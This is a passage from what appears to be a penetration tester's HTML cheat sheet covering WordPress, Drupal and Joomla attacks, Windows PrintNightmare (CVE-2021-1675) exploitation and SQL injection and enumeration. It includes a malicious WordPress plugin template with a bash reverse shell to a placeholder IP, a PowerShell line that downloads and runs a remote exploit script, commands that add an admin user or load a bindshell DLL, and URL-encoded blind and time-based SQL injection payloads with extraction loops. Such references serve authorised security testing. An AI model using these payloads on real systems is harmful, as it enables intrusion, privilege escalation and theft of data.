highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;?</span><span class="n">php</span>
  <span class="cm">/**
  * Plugin Name: Evil Plugin
  * Plugin URI:
  * Description: Evil Plugin
  * Version: 1.0
  * Author: Test
  * Author URI: http://example.com
  */</span>

  <span class="o">&lt;</span><span class="n">payload</span><span class="o">&gt;</span>
  <span class="c1">// Either use msfvenom or exec</span>
  <span class="c1">// exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1'");</span>
<span class="o">?&gt;</span></code></pre></div></div></li> <li>Package it:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip <span class="nt">-r</span> evil.zip evil.php</code></pre></div></div></li> <li>Upload: <code>/wp-admin/plugin-install.php</code></li> <li>Activate it (optional)</li> <li>Or find it under: <ul> <li><code>/wp-content/plugins/evil/evil.php</code></li> <li>or <code>/plugins/evil/evil.php</code></li> </ul> </li> <li>Alternatively you may install a vulnerable <a href="https://www.exploit-db.com/exploits/36374">legit plugin</a></li> </ul> <h6 id="web--apps--cms--wordpress--privilege-escalation--themes"> <a href="#web--apps--cms--wordpress--privilege-escalation--themes" class="anchor-heading" aria-labelledby="web--apps--cms--wordpress--privilege-escalation--themes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Themes </h6> <ul> <li>Create an evil PHP file with the format: <code>&lt;?php &lt;payload&gt;; ?&gt;</code></li> <li>Package it:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip <span class="nt">-r</span> evil.zip evil.php</code></pre></div></div></li> <li>Upload: <code>/wp-admin/theme-install.php</code></li> <li>Activate it (optional)</li> <li>Find it under: <ul> <li><code>/wp-content/themes/evil/evil.php</code></li> <li>or <code>/themes/evil/evil.php</code></li> </ul> </li> </ul> <h6 id="web--apps--cms--wordpress--privilege-escalation--editor"> <a href="#web--apps--cms--wordpress--privilege-escalation--editor" class="anchor-heading" aria-labelledby="web--apps--cms--wordpress--privilege-escalation--editor"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Editor </h6> <ul> <li>Go to: <code>/wp-admin/theme-editor.php</code></li> <li>Select a php file/template (<code>404.php</code>)</li> <li>Check at the bottom that it can be modified</li> <li>Replace with: <code>&lt;?php &lt;payload&gt;; ?&gt;</code></li> <li>Find the modified file under: <ul> <li><code>/wp-content/themes/&lt;theme&gt;/404.php</code></li> <li>or <code>/themes/&lt;theme&gt;/404.php</code></li> </ul> </li> </ul> <h4 id="web--apps--cms--drupal"> <a href="#web--apps--cms--drupal" class="anchor-heading" aria-labelledby="web--apps--cms--drupal"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Drupal </h4> <h5 id="web--apps--cms--drupal--droopescan"> <a href="#web--apps--cms--drupal--droopescan" class="anchor-heading" aria-labelledby="web--apps--cms--drupal--droopescan"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> droopescan </h5> <ul> <li><a href="https://github.com/droope/droopescan">Site</a> - Drupal/WP/Silverstripe scanner<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>droopescan scan drupal <span class="nt">-u</span> &lt;url&gt;
<span class="c"># -U &lt;file&gt; - List of URLs to scan</span>
<span class="c"># --method {not_found,forbidden,ok}</span>
<span class="c">#  Use a different test method</span></code></pre></div></div></li> </ul> <h4 id="web--apps--cms--joomla"> <a href="#web--apps--cms--joomla" class="anchor-heading" aria-labelledby="web--apps--cms--joomla"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Joomla </h4> <h5 id="web--apps--cms--joomla--joomscan"> <a href="#web--apps--cms--joomla--joomscan" class="anchor-heading" aria-labelledby="web--apps--cms--joomla--joomscan"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Joomscan </h5> <ul> <li><a href="https://github.com/OWASP/joomscan">Site</a> - OWASP Joomla scanner:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -ec enumerates components</span>
joomscan.pl <span class="nt">-u</span> &lt;url&gt; <span class="nt">-ec</span>
<span class="c"># -a &lt;UA&gt; - Set User-Agent</span>
<span class="c"># -r - Random User-Agent</span>
<span class="c"># --cookie &lt;str-cookie&gt;</span>
<span class="c"># --timeout &lt;num&gt;</span>

joomscan.pl <span class="nt">--update</span></code></pre></div></div></li> </ul> <h5 id="web--apps--cms--joomla--joomlascan"> <a href="#web--apps--cms--joomla--joomlascan" class="anchor-heading" aria-labelledby="web--apps--cms--joomla--joomlascan"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> JoomlaScan </h5> <ul> <li><a href="https://github.com/drego85/JoomlaScan">Site</a> - Joomla scanner:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joomlascan.py <span class="nt">-u</span> &lt;url&gt; <span class="nt">-t</span> 30
<span class="c"># -t &lt;threads&gt;</span></code></pre></div></div></li> </ul> <h1 id="software"> <a href="#software" class="anchor-heading" aria-labelledby="software"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Software </h1> <h2 id="software--windows"> <a href="#software--windows" class="anchor-heading" aria-labelledby="software--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h2> <h3 id="software--windows--print-spooler---cve-2021-1675"> <a href="#software--windows--print-spooler---cve-2021-1675" class="anchor-heading" aria-labelledby="software--windows--print-spooler---cve-2021-1675"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Print Spooler - CVE-2021-1675 </h3> <h4 id="software--windows--print-spooler---cve-2021-1675--detection"> <a href="#software--windows--print-spooler---cve-2021-1675--detection" class="anchor-heading" aria-labelledby="software--windows--print-spooler---cve-2021-1675--detection"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Detection </h4> <ul> <li>Check if the <code>spool</code> service is active</li> <li>For patched systems check this:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">REG</span> <span class="kd">QUERY</span> <span class="s2">"HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"</span>

<span class="c">:: Still vulnerable if it returns:</span>
<span class="kd">HKEY_LOCAL_MACHINE</span>\Software\Policies\Microsoft\Windows <span class="kd">NT</span>\Printers\PointAndPrint
  <span class="kd">RestrictDriverInstallationToAdministrators</span>    <span class="kd">REG_DWORD</span>    <span class="mh">0x0</span>
  <span class="kd">NoWarningNoElevationOnInstall</span>    <span class="kd">REG_DWORD</span>    <span class="mh">0x1</span></code></pre></div></div></li> </ul> <h4 id="software--windows--print-spooler---cve-2021-1675--invoke-nightmare"> <a href="#software--windows--print-spooler---cve-2021-1675--invoke-nightmare" class="anchor-heading" aria-labelledby="software--windows--print-spooler---cve-2021-1675--invoke-nightmare"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Invoke-Nightmare </h4> <ul> <li><a href="https://github.com/calebstewart/CVE-2021-1675">Site</a> - PowerShell Local LPE PrivEsc<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">Import</span><span class="na">-Module </span>.\cve<span class="o">-</span><span class="m">2021</span><span class="o">-</span><span class="m">1675</span>.ps1

<span class="c">:: Or load from remote server</span>
<span class="kd">IEX</span><span class="o">(</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">Net</span>.Webclient<span class="o">)</span>.downloadstring<span class="o">(</span><span class="s1">'http://&lt;ip&gt;/cve-2021-1675.ps1'</span><span class="o">)</span>

<span class="c">:: Add new admin user</span>
<span class="kd">Invoke</span><span class="na">-Nightmare -DriverName </span><span class="s2">"Xerox"</span> <span class="na">-NewUser </span><span class="s2">"john"</span> <span class="na">-NewPassword </span><span class="s2">"password"</span>

<span class="c">:: Execute DLL as admin</span>
<span class="kd">Invoke</span><span class="na">-Nightmare -DLL </span><span class="s2">"C:\path\to\bindshell.dll"</span></code></pre></div></div></li> </ul> <h4 id="software--windows--print-spooler---cve-2021-1675--cube0x0-impacket-rce---remote"> <a href="#software--windows--print-spooler---cve-2021-1675--cube0x0-impacket-rce---remote" class="anchor-heading" aria-labelledby="software--windows--print-spooler---cve-2021-1675--cube0x0-impacket-rce---remote"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Cube0x0 Impacket RCE - Remote </h4> <ul> <li><a href="https://github.com/cube0x0/CVE-2021-1675">Site</a> - Remote Exploit CVE-2021-34527:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Scan for the vulnerability</span>
rpcdump.py @&lt;ip&gt; | <span class="nb">grep</span> <span class="s1">'MS-RPRN\|MS-PAR'</span>

<span class="c"># Check the site for steps to build</span>
./CVE-2021-1675.py &lt;dom&gt;/&lt;usr&gt;:&lt;<span class="nb">pwd</span><span class="o">&gt;</span>@&lt;ip&gt; <span class="s1">'\\&lt;local-ip&gt;\share\addCube.dll'</span></code></pre></div></div></li> <li><a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html#cube0x0-impacket-rce">Another guide</a></li> </ul> <h4 id="software--windows--print-spooler---cve-2021-1675--printerbug-py"> <a href="#software--windows--print-spooler---cve-2021-1675--printerbug-py" class="anchor-heading" aria-labelledby="software--windows--print-spooler---cve-2021-1675--printerbug-py"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> printerbug.py </h4> <ul> <li><a href="https://github.com/dirkjanm/krbrelayx">Site</a> - Auth -&gt; SpoolService bug -&gt; SMB<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Force auth with attacker responder</span>
printerbug.py <span class="o">[[</span>&lt;dom&gt;/]&lt;user&gt;[:&lt;pass&gt;]@]&lt;host/ip&gt; &lt;attacker-ip&gt;</code></pre></div></div></li> </ul> <h1 id="sql"> <a href="#sql" class="anchor-heading" aria-labelledby="sql"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SQL </h1> <h2 id="sql--sqli"> <a href="#sql--sqli" class="anchor-heading" aria-labelledby="sql--sqli"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SQLi </h2> <h3 id="sql--sqli--bruteforce"> <a href="#sql--sqli--bruteforce" class="anchor-heading" aria-labelledby="sql--sqli--bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce </h3> <h4 id="sql--sqli--bruteforce--dictionaries"> <a href="#sql--sqli--bruteforce--dictionaries" class="anchor-heading" aria-labelledby="sql--sqli--bruteforce--dictionaries"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Dictionaries </h4> <ul> <li>Use the <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi">SecLists</a>: <ul> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Fuzzing/SQLi/quick-SQLi.txt">quick-SQLi</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Fuzzing/SQLi/Generic-SQLi.txt">Generic-SQLi</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt">Generic-BlindSQLi</a> &lt;- Last resort</li> </ul> </li> </ul> <h4 id="sql--sqli--bruteforce--ffuf"> <a href="#sql--sqli--bruteforce--ffuf" class="anchor-heading" aria-labelledby="sql--sqli--bruteforce--ffuf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ffuf </h4> <ul> <li><a href="https://github.com/ffuf/ffuf">Site</a> - Most flexible fuzzer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Capture request: FUZZ in usr/pass</span>
ffuf <span class="nt">-request</span> &lt;req&gt; <span class="nt">-mode</span> pitchfork <span class="nt">-c</span> <span class="nt">-ac</span> <span class="nt">-w</span> &lt;wlist&gt;
<span class="c"># -request-proto http - Force HTTP</span></code></pre></div></div></li> </ul> <h3 id="sql--sqli--blind"> <a href="#sql--sqli--blind" class="anchor-heading" aria-labelledby="sql--sqli--blind"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Blind </h3> <ul> <li>SQLi to use with the command below:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- URL encoded</span>
<span class="o">%</span><span class="s1">'))%20and%20strcmp(upper(substr(database(),$1,1)),'</span><span class="err">$</span><span class="mi">2</span><span class="s1">')%3d0%20--%20</span></code></pre></div></div></li> <li><code>zsh</code> command:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># curl.sh contains Burp copy-to-curl</span>
<span class="c"># sh &lt;&lt;EOF</span>
<span class="c">#   curl -X POST -H $'...' -d '...'</span>
<span class="c"># curl method without $'..' -&gt; '..'</span>
<span class="nb">echo</span><span class="p">;</span> <span class="k">for</span> <span class="o">((</span><span class="nv">i</span><span class="o">=</span>1<span class="p">;;</span>i++<span class="o">))</span><span class="p">;</span> <span class="k">do for </span>c <span class="k">in</span> <span class="o">{</span>65..96<span class="o">}</span> <span class="o">{</span>32..64<span class="o">}</span> <span class="o">{</span>123..126<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nv">c</span><span class="o">=</span><span class="s2">"</span><span class="k">$((</span><span class="o">[</span><span class="c">##16]c))"; while :; do sleep 1; { ./curl.sh "$i" "%$c" || continue } | { grep -m1 -q 'Agradecido' &amp;&amp; { echo -ne "\x$c"; continue 3 } }; break; done; done; break; done; echo</span>
<span class="c"># curl.sh can also be a function</span></code></pre></div></div></li> </ul> <h3 id="sql--sqli--time-based"> <a href="#sql--sqli--time-based" class="anchor-heading" aria-labelledby="sql--sqli--time-based"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Time-based </h3> <ul> <li>SQLi to use with the command below:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- URL encoded</span>
<span class="c1">-- Used for str concatenation</span>
<span class="s1">'%2b(select%20'</span><span class="n">a</span><span class="s1">'%20union%20SELECT(if((STRCMP(upper(substring(CURRENT_USER(),$1,1)),'</span><span class="err">$</span><span class="mi">2</span><span class="s1">'))%3d0,SLEEP(10),0)))%2b'</span>

<span class="c1">-- Used for AND sqli</span>
<span class="s1">')+AND+(SELECT+1310+FROM+((SELECT(if((STRCMP(upper(substring(CURRENT_USER(),$1,1)),%27$2%27))%3d0,SLEEP(20),0))))fDpl)--+'</span></code></pre></div></div></li> <li><code>zsh</code> command:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># curl.sh contains Burp copy-to-curl</span>
<span class="c"># sh &lt;&lt;EOF</span>
<span class="c">#   curl -s -o /dev/null -H $'...'</span>
<span class="c"># curl method without $'..' -&gt; '..'</span>
<span class="nb">echo</span><span class="p">;</span> <span class="k">for</span> <span class="o">((</span><span class="nv">i</span><span class="o">=</span>1<span class="p">;;</span>i++<span class="o">))</span><span class="p">;</span> <span class="k">do for </span>c <span class="k">in</span> <span class="o">{</span>65..96<span class="o">}</span> <span class="o">{</span>32..64<span class="o">}</span> <span class="o">{</span>123..126<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nv">c</span><span class="o">=</span><span class="s2">"</span><span class="k">$((</span><span class="o">[</span><span class="c">##16]c))"; while :; do sleep 1; timeout 6 ./curl.sh "$i" "%$c" &amp;&amp; break; [ $? -eq 124 ] &amp;&amp; { echo -ne "\x$c"; continue 3 }; done; done; break; done; echo</span>
<span class="c"># curl.sh can be: "$0 $i %$c curl"</span></code></pre></div></div></li> </ul> <h2 id="sql--general"> <a href="#sql--general" class="anchor-heading" aria-labelledby="sql--general"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> General </h2> <h3 id="sql--general--find-all-databases"> <a href="#sql--general--find-all-databases" class="anchor-heading" aria-labelledby="sql--general--find-all-databases"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Find all databases </h3> <h4 id="sql--general--find-all-databases--t-sql"> <a href="#sql--general--find-all-databases--t-sql" class="anchor-heading" aria-labelledby="sql--general--find-all-databases--t-sql"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> T-SQL </h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">databases</span>

<span class="c1">-- Older</span>
<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span>

<span class="c1">-- Alternative</span>
<span class="k">EXEC</span> <span class="n">sp_databases</span></code></pre></div></div> <h3 id="sql--general--select-a-database"> <a href="#sql--general--select-a-database" class="anchor-heading" aria-labelledby="sql--general--select-a-database"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Select a database </h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">USE</span> <span class="o">&lt;</span><span class="k">database</span><span class="o">&gt;</span></code></pre></div></div> <h3 id="sql--general--find-all-schemas"> <a href="#sql--general--find-all-schemas" class="anchor-heading" aria-labelledby="sql--general--find-all-schemas"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Find all schemas </h3> <ul> <li>From <a href="https://dba.stackexchange.com/a/93923">here</a>:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">schema_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span></code></pre></div></div></li> </ul> <h3 id="sql--general--find-all-tables"> <a href="#sql--general--find-all-tables" class="anchor-heading" aria-labelledby="sql--general--find-all-tables"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Find all tables </h3> <ul> <li>General:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- From currently selected DB</span>
<span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>

<span class="c1">-- From non-selected DB</span>
<span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="n">db</span><span class="o">&gt;</span><span class="p">.</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span></code></pre></div></div></li> <li>Associated with a schema:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span> <span class="o">=</span> <span class="s1">'&lt;schema&gt;'</span></code></pre></div></div></li> <li>Associated with their DBs:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- Some DBs may require using AS when declaring the identifier:</span>
<span class="c1">-- information_schema.schemata AS s</span>
<span class="k">SELECT</span> <span class="n">s</span><span class="p">.</span><span class="k">schema_name</span><span class="p">,</span> <span class="n">t</span><span class="p">.</span><span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span> <span class="n">s</span> <span class="k">INNER</span> <span class="k">JOIN</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="n">t</span> <span class="k">ON</span> <span class="n">s</span><span class="p">.</span><span class="k">schema_name</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">table_schema</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="k">schema_name</span><span class="p">,</span> <span class="k">table_name</span></code></pre></div></div></li> </ul> <h3 id="sql--general--find-the-columns-in-a-table"> <a href="#sql--general--find-the-columns-in-a-table" class="anchor-heading" aria-labelledby="sql--general--find-the-columns-in-a-table"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Find the columns in a table </h3> <ul> <li>Identify:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'&lt;table-name&gt;'</span></code></pre></div></div></li> <li>Then query the table:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">&lt;</span><span class="k">column</span><span class="o">&gt;</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span>

<span class="c1">-- Using a DB object</span>
<span class="k">SELECT</span> <span class="o">&lt;</span><span class="k">column</span><span class="o">&gt;</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="n">dbo</span><span class="o">&gt;</span><span class="p">.</span><span class="o">&lt;</span><span class="k">table</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span>

<span class="c1">-- The databases listed in inf schema</span>
<span class="c1">-- may need to be accessed by</span>
<span class="c1">-- Using a DB object</span>
<span class="k">SELECT</span> <span class="o">&lt;</span><span class="k">column</span><span class="o">&gt;</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="n">db</span><span class="o">&gt;</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="o">&lt;</span><span class="k">table</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h2 id="sql--mysql"> <a href="#sql--mysql" class="anchor-heading" aria-labelledby="sql--mysql"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> MySQL </h2> <h3 id="sql--mysql--connection"> <a href="#sql--mysql--connection" class="anchor-heading" aria-labelledby="sql--mysql--connection"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Connection </h3> <h4 id="sql--mysql--connection--linux"> <a href="#sql--mysql--connection--linux" class="anchor-heading" aria-labelledby="sql--mysql--connection--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h4> <h5 id="sql--mysql--connection--linux--mysql"> <a href="#sql--mysql--connection--linux--mysql" class="anchor-heading" aria-labelledby="sql--mysql--connection--linux--mysql"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> mysql </h5> <ul> <li>MySQL client<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> &lt;usr&gt; <span class="nt">-D</span> &lt;db&gt; <span class="nt">-p</span> <span class="o">[</span>&lt;pass&gt;]
<span class="c"># -P &lt;port&gt; - Different port</span>
<span class="c"># -h &lt;ip&gt;   - Remote connection</span>
<span class="c"># -C        - Use compression</span>
<span class="c"># -e &lt;cmd&gt;  - Oneshot command/query</span>
<span class="c"># -r        - Raw output</span></code></pre></div></div></li> </ul> <h3 id="sql--mysql--enumeration"> <a href="#sql--mysql--enumeration" class="anchor-heading" aria-labelledby="sql--mysql--enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumeration </h3> <ul> <li>List tables and system users<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- List all databases</span>
<span class="k">SHOW</span> <span class="n">DATABASES</span><span class="p">;</span>

<span class="c1">-- Change database</span>
<span class="n">USE</span> <span class="o">&lt;</span><span class="n">db</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span>

<span class="c1">-- Tables in the selected DB</span>
<span class="k">SHOW</span> <span class="n">TABLES</span><span class="p">;</span>

<span class="c1">-- List 'system' table</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="o">&lt;</span><span class="n">db</span><span class="o">&gt;</span><span class="p">.</span><span class="k">system</span>

<span class="c1">-- All system users info</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span>

<span class="c1">-- User currently running the DB</span>
<span class="k">SELECT</span> <span class="k">CURRENT_USER</span><span class="p">();</span>

<span class="c1">-- User who started the DB</span>
<span class="k">SELECT</span> <span class="k">USER</span><span class="p">();</span>

<span class="c1">-- User's permissions</span>
<span class="k">SELECT</span> <span class="k">CURRENT_ROLE</span><span class="p">();</span>

<span class="c1">-- MySQL server version</span>
<span class="k">SELECT</span> <span class="k">VERSION</span><span class="p">();</span>

<span class="c1">-- Current database</span>
<span class="k">SELECT</span> <span class="k">DATABASE</span><span class="p">();</span>

<span class="c1">-- Current server variables</span>
<span class="k">SHOW</span> <span class="n">VARIABLES</span><span class="p">;</span></code></pre></div></div></li> </ul> <h2 id="sql--t-sql--mssql-"> <a href="#sql--t-sql--mssql-" class="anchor-heading" aria-labelledby="sql--t-sql--mssql-"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> T-SQL (MSSQL) </h2> <h3 id="sql--t-sql--mssql---connection"> <a href="#sql--t-sql--mssql---connection" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---connection"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Connection </h3> <h4 id="sql--t-sql--mssql---connection--windows"> <a href="#sql--t-sql--mssql---connection--windows" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---connection--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h4> <ul> <li><code>osql</code>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Use default auth and master db</span>
<span class="kd">osql</span> <span class="na">-E
</span><span class="c">:: Run the commands with: go</span></code></pre></div></div></li> <li><code>sqlcmd</code>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Almost like osql</span>
<span class="kd">sqlcmd</span> <span class="na">-E
</span><span class="c">:: Set the output width: -w&lt;cols&gt;</span></code></pre></div></div></li> </ul> <h4 id="sql--t-sql--mssql---connection--linux"> <a href="#sql--t-sql--mssql---connection--linux" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---connection--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h4> <h5 id="sql--t-sql--mssql---connection--linux--mssqlclient-py"> <a href="#sql--t-sql--mssql---connection--linux--mssqlclient-py" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---connection--linux--mssqlclient-py"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> mssqlclient.py </h5> <ul> <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">Site</a> - Impacket mssqlclient.py:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mssqlclient.py &lt;DOMAIN/&gt;&lt;user&gt;@&lt;ip&gt; <span class="nt">-windows-auth</span>
<span class="c"># Check the -k and -hashes flags</span></code></pre></div></div></li> </ul> <h5 id="sql--t-sql--mssql---connection--linux--sqsh"> <a href="#sql--t-sql--mssql---connection--linux--sqsh" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---connection--linux--sqsh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> sqsh </h5> <ul> <li><a href="https://github.com/vonloxley/sqsh">Site</a> - Multi SQL shell:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Supports what mssqlclient doesn't</span>
sqsh <span class="nt">-U</span> &lt;user&gt; <span class="nt">-P</span> &lt;pass&gt; <span class="nt">-D</span> &lt;db&gt; <span class="nt">-S</span> &lt;ip/server&gt;
<span class="c"># Use 'go' to run the SQL queries</span>
<span class="c"># &amp; 'go -m pretty' -&gt; better output</span></code></pre></div></div></li> </ul> <h3 id="sql--t-sql--mssql---linked-servers"> <a href="#sql--t-sql--mssql---linked-servers" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---linked-servers"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linked Servers </h3> <h4 id="sql--t-sql--mssql---linked-servers--list"> <a href="#sql--t-sql--mssql---linked-servers--list" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---linked-servers--list"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> List </h4> <ul> <li>From <a href="https://database.guide/2-ways-to-return-a-list-of-linked-servers-in-sql-server-using-t-sql/">here</a>:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- Name only</span>
<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">servers</span>

<span class="c1">-- Name and maybe IP</span>
<span class="k">SELECT</span> <span class="n">name</span><span class="p">,</span> <span class="n">data_source</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">servers</span>

